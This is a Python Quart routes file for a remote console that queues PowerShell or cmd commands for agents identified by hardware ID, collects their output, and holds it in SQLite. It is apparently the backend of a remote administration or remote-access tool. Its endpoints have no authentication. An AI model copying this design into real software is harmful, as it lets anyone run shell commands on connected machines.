import asyncio
import json
import base64
import aiosqlite
from quart import request, jsonify, websocket
from config import DATABASE
from util.rate_limit import api_rate_limit


def register_console_routes(app):
    """Register console routes with the app"""

    @app.route("/api/console/execute", methods=["POST"])
    @api_rate_limit()
    async def execute_console_command():
        """Execute a console command on a specific agent"""
        try:
            data = await request.get_json()
            user_id = data.get("user_id")
            command = data.get("command")
            shell_type = data.get("shell_type", "powershell")  # powershell or cmd
            
            if not user_id or not command:
                return jsonify({"status": "error", "message": "Missing user_id or command"}), 400

            # Get user HWID from database
            async with aiosqlite.connect(DATABASE) as db:
                db.row_factory = aiosqlite.Row
                cursor = await db.execute("SELECT hwid FROM user WHERE id = ?", (user_id,))
                user = await cursor.fetchone()
                
                if not user:
                    return jsonify({"status": "error", "message": "User not found"}), 404
                
                hwid = user["hwid"]

            # Store the command for the agent to pick up
            command_data = {
                "type": "console_command",
                "shell_type": shell_type,
                "command": command,
                "timestamp": asyncio.get_event_loop().time()
            }
            
            # Store in database for persistence
            async with aiosqlite.connect(DATABASE) as db:
                cursor = await db.execute(
                    """
                    INSERT INTO console_commands (user_id, command, shell_type, status, created_at)
                    VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
                    """,
                    (user_id, command, shell_type, "pending")
                )
                await db.commit()
                
                # Get the command ID that was just created
                command_id = cursor.lastrowid

                return jsonify({
                    "status": "success",
                    "message": "Command sent for execution",
                    "command_id": command_id
                })

        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500

    @app.route("/api/console/queue/<int:command_id>", methods=["POST"])
    @api_rate_limit()
    async def queue_console_command(command_id):
        """Queue a console command for execution (called when execute button is clicked)"""
        try:
            async with aiosqlite.connect(DATABASE) as db:
                # Check if command exists and is in "pending" status
                cursor = await db.execute(
                    "SELECT id, status FROM console_commands WHERE id = ? AND status = 'pending'",
                    (command_id,)
                )
                command = await cursor.fetchone()
                
                if not command:
                    return jsonify({"status": "error", "message": "Command not found or already queued"}), 404
                
                # Change status to "executing" (agent is processing)
                await db.execute(
                    "UPDATE console_commands SET status = 'executing' WHERE id = ?",
                    (command_id,)
                )
                await db.commit()
                
                return jsonify({
                    "status": "success",
                    "message": "Command marked as executing"
                })

        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500

    @app.route("/api/console/commands/<int:user_id>", methods=["GET"])
    @api_rate_limit()
    async def get_console_commands(user_id):
        """Get console commands for a specific user"""
        try:
            async with aiosqlite.connect(DATABASE) as db:
                db.row_factory = aiosqlite.Row
                cursor = await db.execute(
                    """
                    SELECT id, command, shell_type, status, output, created_at, executed_at
                    FROM console_commands 
                    WHERE user_id = ? 
                    ORDER BY created_at DESC 
                    LIMIT 50
                    """,
                    (user_id,)
                )
                commands = await cursor.fetchall()
                
                result = []
                for cmd in commands:
                    result.append({
                        "id": cmd["id"],
                        "command": cmd["command"],
                        "shell_type": cmd["shell_type"],
                        "status": cmd["status"],
                        "output": cmd["output"],
                        "created_at": cmd["created_at"],
                        "executed_at": cmd["executed_at"]
                    })
                
                return jsonify({"status": "success", "commands": result})

        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500

    @app.route("/api/console/command/<int:command_id>/output", methods=["POST"])
    @api_rate_limit()
    async def update_command_output(command_id):
        """Update command output (called by agent)"""
        try:
            data = await request.get_json()
            output = data.get("output", "")
            status = data.get("status", "completed")
            
            async with aiosqlite.connect(DATABASE) as db:
                await db.execute(
                    """
                    UPDATE console_commands 
                    SET output = ?, status = ?, executed_at = CURRENT_TIMESTAMP
                    WHERE id = ?
                    """,
                    (output, status, command_id)
                )
                await db.commit()
            
            return jsonify({"status": "success"})

        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500

    @app.route("/api/console/clear/<int:user_id>", methods=["DELETE"])
    @api_rate_limit()
    async def clear_console_commands(user_id):
        """Clear all console commands for a specific user"""
        try:
            async with aiosqlite.connect(DATABASE) as db:
                await db.execute(
                    """
                    DELETE FROM console_commands 
                    WHERE user_id = ?
                    """,
                    (user_id,)
                )
                await db.commit()
            
            return jsonify({"status": "success", "message": "Console commands cleared successfully"})

        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500

    @app.route("/api/console/command/<int:command_id>", methods=["DELETE"])
    @api_rate_limit()
    async def delete_console_command(command_id):
        """Delete a specific console command by ID"""
        try:
            async with aiosqlite.connect(DATABASE) as db:
                # First check if the command exists
                cursor = await db.execute("SELECT user_id FROM console_commands WHERE id = ?", (command_id,))
                command = await cursor.fetchone()
                
                if not command:
                    return jsonify({"status": "error", "message": "Command not found"}), 404
                
                # Delete the command
                await db.execute("DELETE FROM console_commands WHERE id = ?", (command_id,))
                await db.commit()
            
            return jsonify({"status": "success", "message": "Command deleted successfully"})

        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500

    @app.websocket("/ws/console/<int:user_id>")
    async def console_websocket(user_id):
        """WebSocket endpoint for real-time console communication"""
        try:
            # Send initial connection message
            await websocket.send(json.dumps({
                "type": "connection",
                "message": "Console connected",
                "user_id": user_id
            }))
            
            # Keep connection alive and handle incoming messages
            while True:
                try:
                    data = await websocket.receive()
                    message = json.loads(data)
                    
                    if message.get("type") == "ping":
                        await websocket.send(json.dumps({"type": "pong"}))
                        
                except Exception as e:
                    print(f"WebSocket error: {e}")
                    break
                    
        except Exception as e:
            print(f"Console WebSocket error: {e}")
        finally:
            print(f"Console WebSocket disconnected for user {user_id}")

    return app
